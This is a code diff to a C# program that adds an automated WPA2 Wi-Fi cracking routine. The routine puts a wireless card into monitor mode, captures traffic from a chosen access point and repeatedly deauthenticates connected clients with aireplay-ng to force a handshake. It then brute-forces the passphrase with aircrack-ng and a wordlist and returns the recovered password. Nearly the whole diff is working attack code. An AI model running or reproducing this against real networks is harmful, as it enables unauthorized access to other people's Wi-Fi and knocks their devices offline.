@@ -1,8 +1,10 @@
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Security.AccessControl;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace jchcar
@@ -28,13 +30,7 @@ namespace jchcar
 
         public string GetInterfaceName()
         {
-            Process p = new Process();
-            p.StartInfo.FileName = "/bin/bash";
-            p.StartInfo.Arguments = "-c \"iw dev | grep -Eo 'wl.*'\"";
-            p.StartInfo.RedirectStandardOutput = true;
-            p.StartInfo.UseShellExecute = false;
-            p.Start();
-            string[] response = p.StandardOutput.ReadToEnd().Split('\n');
+            string[] response = GetOutputLines("/bin/bash", "-c \"iw dev | grep -Eo 'wl.*'\"");
             foreach (var s in response)
             {
                 Console.WriteLine(s);
@@ -47,53 +43,126 @@ namespace jchcar
             return "";
         }
 
-        public void ManagedMode()
+        private void ManagedMode()
         { 
-            Process p = new Process();
-            p.StartInfo.FileName = "/usr/sbin/airmon-ng";
-            p.StartInfo.Arguments = "stop "+GetInterfaceName();
-            p.Start();
-            p.WaitForExit();
+            RunCommand("/usr/sbin/airmon-ng", "stop "+GetInterfaceName());
 
         }
 
 
-        public void CrackWifi(Wifi w)
+        public string CrackWPA2(Wifi w)
         {
+            RunCommand("/bin/bash", "-c \"rm /home/jc/psk*\"");
+            RunCommand("/usr/sbin/airmon-ng", "start "+GetInterfaceName()+" "+w.channel);
             Process p = new Process();
-            p.StartInfo.FileName = "/usr/sbin/airmon-ng";
-            p.StartInfo.Arguments = "start "+GetInterfaceName()+" "+w.channel;
-
-            p.Start();
-            p.WaitForExit();
-            p.StartInfo.FileName = "/usr/sbin/airodump-ng";
-            p.StartInfo.Arguments = "-c "+w.channel+" --bssid "+w.BSSID+" -w psk "+GetInterfaceName();
+            p.StartInfo.FileName = "/bin/bash";
+            p.StartInfo.Arguments = "-c \"/usr/sbin/airodump-ng -c "+w.channel+" --bssid "+w.BSSID+" -w /home/jc/psk "+GetInterfaceName()+"\"";
             p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.RedirectStandardError = true;
+            p.StartInfo.RedirectStandardInput = true;
             p.StartInfo.UseShellExecute = false;
+            p.StartInfo.CreateNoWindow = false;
             p.Start();
-            while (!p.HasExited && !p.StandardOutput.EndOfStream)
-            {
-                string line = p.StandardOutput.ReadLine();
-                Console.WriteLine(line);
-                if (line.Contains("WPA handshake"))
-                {
-                    p.Close();
-                }
-            }
             
+            while (!p.HasExited)
+            {
+                Console.WriteLine("Listening for packets...");
+               Thread.Sleep(5000);
+               p.Kill();
+               
+               if (p.StandardError.ReadToEnd().Contains("WPA handshake"))
+               {
+
+                   Console.WriteLine("Got handshake");
+                   RunCommand("/usr/bin/aircrack-ng","/home/jc/psk-01.cap -w /home/jc/wordlist.txt -l /home/jc/wifipass.txt");
+                   if (File.Exists("/home/jc/wifipass.txt"))
+                   {
+                       StreamReader sr = new StreamReader("/home/jc/wifipass.txt");
+                       string password = sr.ReadLine();
+                       Console.WriteLine("password found! : "+password);
+                       sr.Close();
+                       RunCommand("/bin/bash", "-c \"rm /home/jc/psk*\"");
+                       RunCommand("/bin/bash", "-c \"rm /home/jc/wifipass.txt\"");
+                       return password;
+
+                   }
+                   else
+                   {
+                       Console.WriteLine("Could not find password in wordlist");
+                   }
+                   
+                   break;
+                   // TODO if we have handshake
+               }
+               else
+               {
+                   foreach (var mac in getMACs())
+                   {
+                       Deauth(w,mac);
+                   }
+                   RunCommand("/bin/bash", "-c \"rm /home/jc/psk*\"");
+                   p.Start();
+               }
+            }
+            Console.WriteLine("Ended");
+            return null;
+        }
+
+        public List<string> getMACs()
+        {
+            List<string> macs = new List<string>();
+            StreamReader sr = new StreamReader("/home/jc/psk-01.csv");
+            if(!sr.EndOfStream)
+            while (!sr.ReadLine().StartsWith("Station MAC") && !sr.EndOfStream)
+            {
+                
+            }
+
+            while (!sr.EndOfStream)
+            {
+                macs.Add(sr.ReadLine().Split(',')[0]);
+            }
+            sr.Close();
+            return macs;
+
+        }
+
+        public void RunCommand(string file, string arguments)
+        {
+            Console.WriteLine("Starting command "+file+" "+arguments);
+            Process p2 = new Process();
+            p2.StartInfo.FileName = file;
+            p2.StartInfo.Arguments = arguments;
+            p2.Start();
+            p2.WaitForExit();
+        }
+
+        public string[] GetOutputLines(string file, string arguments)
+        {
+            Console.WriteLine("Starting command "+file+" "+arguments);
+            Process p2 = new Process();
+            p2.StartInfo.FileName = file;
+            p2.StartInfo.Arguments = arguments;
+            p2.StartInfo.RedirectStandardOutput = true;
+            p2.StartInfo.RedirectStandardError = true;
+            p2.StartInfo.UseShellExecute = false;
+            p2.Start();
+            p2.WaitForExit();
+            return p2.StandardOutput.ReadToEnd().Split('\n');
+        }
+
+        public void Deauth(Wifi w, string clientMAC)
+        {
+            //aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 ath0
+            if(clientMAC!="")
+            RunCommand("/usr/sbin/aireplay-ng", "-0 1 -a "+w.BSSID+" -c "+clientMAC+" "+GetInterfaceName());
         }
 
         public List<Wifi> Scan()
         {
             ManagedMode();
             List<Wifi> wifiList = new List<Wifi>();
-            Process p = new Process();
-            p.StartInfo.FileName = "/sbin/iwlist";
-            p.StartInfo.Arguments = GetInterfaceName()+" scan";
-            p.StartInfo.RedirectStandardOutput = true;
-            p.StartInfo.UseShellExecute = false;
-            p.Start();
-            string[] response = p.StandardOutput.ReadToEnd().Split('\n');
+            string[] response = GetOutputLines("/sbin/iwlist", GetInterfaceName()+" scan");
             Wifi current = new Wifi();
             foreach (string s in response)
             {
